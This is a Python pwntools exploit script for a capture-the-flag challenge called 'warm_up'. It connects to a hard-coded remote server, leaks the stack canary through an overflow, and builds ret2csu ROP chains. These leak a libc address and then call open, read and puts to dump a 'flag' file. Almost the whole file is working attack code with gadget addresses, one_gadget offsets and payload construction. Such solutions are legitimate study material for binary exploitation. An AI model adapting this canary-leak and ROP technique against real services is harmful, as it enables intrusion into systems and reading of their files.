'''191122nctf warm_up, reference: https://zhuanlan.kanxue.com/article-97.htm'''
#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. have libc, since need to calculate offset for system and 'bin/sh' from write/read
# 3. need to compile with -no-pie, since need to find gadget
# 4. csu_init could ONLY set edi, so the first argument should be ONLY 32bit
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = 'debug'
#context(os='linux', arch='amd64', log_level='debug')

local = 0
if local:
#	p = process('./warm_up')
  p=process(['./warm_up'],env={'LD_PRELOAD':'./libc-2.23.so'},aslr='FALSE')
else:
  p = remote('139.129.76.65', 50007)

libc = ELF('./libc-2.23.so')

elf = ELF('./warm_up')

one_gadget_offset1 = 0x45216
one_gadget_offset2 = 0x4526a
one_gadget_offset3 = 0xf02a4 #double free to use malloc_printerr invoke __malloc_hook
one_gadget_offset4 = 0xf1147

read_plt = elf.symbols['read']
print 'read_plt= ' + hex(read_plt)
read_got = elf.got['read']
print 'read_got= ' + hex(read_got)
puts_got = elf.got['puts']
print 'puts_got= ' + hex(puts_got)
start_addr = elf.start # it would fail if using elf.symbols['main']
print 'start_addr= ' + hex(start_addr)
bss_addr = elf.bss()
print "bss_addr=" + hex(bss_addr)

junk = 0

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()

def get_canary():
  p.recvuntil('warm up!!!\n')
  p.send('a'*0x19)
  p.recvuntil('a'*0x19)
  canary = p.recv(7).rjust(8,'\x00')
  print 'canary= ' + canary
  return canary

#pop junk, rbx, rbp, r12, r13, r14, r15
pop_junk_rbx_rbp_r12_r13_r14_r15 = 0x400bb6 #0x400606
# Notice rdx and rdi sequence!!!!
#mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
#mov_mov_mov_call = 0x4005F0
#junk, rbx=0, rbp=1, r12=fun_addr_relative, r13=rdi, r14=rsi, r15=rdx
#mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword ptr [r12+rbx*8]
mov_mov_mov_call = 0x400ba0
#junk, rbx=0, rbp=1, r12=fun_addr_relative, r13=rdx, r14=rsi, r15=rdi


def pwnInOne():
  canary = get_canary()
  #read length 0x100 could ONLY accept 2 times call
  payload = 'a'*0x18 + canary + 'a'*0x8 + p64(pop_junk_rbx_rbp_r12_r13_r14_r15)
  payload += p64(junk) + p64(0) + p64(1) + p64(puts_got) + p64(0) + p64(0) + p64(read_got) #put(read_got)
  payload += p64(mov_mov_mov_call) + 'a'*8
  payload += p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_addr + 0x30) + p64(0) #read(0, bss_addr + 0x30, 16), read open_addr and 'flag'
  payload += p64(mov_mov_mov_call) + 'a'*8*7 + p64(0x400AB6)
  #z()
  p.send(payload)
  
  p.recvuntil(' ?')
  read_addr = u64(p.recv(6).ljust(8,'\x00'))
  print 'read_addr= ' + hex(read_addr)
  libc_base = read_addr - libc.symbols['read']
  print 'libc_base= ' + hex(libc_base)
  open_addr = libc_base + libc.symbols['open']
  print 'open_addr= ' + hex(open_addr)
  sleep(1)  # would fail if not sleep!!! since send data would mess up
  p.send(p64(open_addr) + "flag\0")
  
  canary = get_canary()
  payload = 'a'*0x18 + canary + 'a'*0x8 + p64(pop_junk_rbx_rbp_r12_r13_r14_r15)
  payload += p64(junk) + p64(0) + p64(1) + p64(bss_addr + 0x30) + p64(0) + p64(0) + p64(bss_addr + 0x38) #rax = open("flag", 0)=3 #flags:0: O_RDONLY
  payload += p64(mov_mov_mov_call) + 'a'*8
  payload += p64(0) + p64(1) + p64(read_got) + p64(100) + p64(bss_addr + 0x40) + p64(3) #read(3, bss_addr + 0x40, 100),fd = 3!!!
  payload += p64(mov_mov_mov_call) + 'a'*8*7 + p64(0x400AB6)
  p.send(payload)
  
  canary = get_canary()
  payload = 'a'*0x18 + canary + 'a'*0x8 + p64(pop_junk_rbx_rbp_r12_r13_r14_r15)
  payload += p64(junk) + p64(0) + p64(1) + p64(puts_got) + p64(0) + p64(0) + p64(bss_addr + 0x40) #put(bss_addr + 0x40) 0: O_RDONLY
  payload += p64(mov_mov_mov_call) + 'a'*8*7 + p64(0x400AB6)
  p.send(payload)

pwnInOne()
p.interactive()
